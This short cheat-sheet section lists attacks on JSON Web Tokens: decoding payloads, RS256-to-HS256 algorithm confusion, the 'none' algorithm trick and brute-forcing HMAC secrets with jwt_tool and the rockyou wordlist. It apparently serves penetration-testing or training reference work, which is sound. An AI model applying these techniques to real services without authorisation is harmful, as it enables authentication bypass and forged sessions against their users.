## JWT Attacks

```bash
# Decode without verification (jwt.io or manually)
echo "PAYLOAD_BASE64" | base64 -d

# Algorithm confusion: change "alg": "RS256" → "HS256" and sign with public key

# None algorithm attack
# Set "alg": "none", remove signature

# Brute-force weak HMAC secret
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

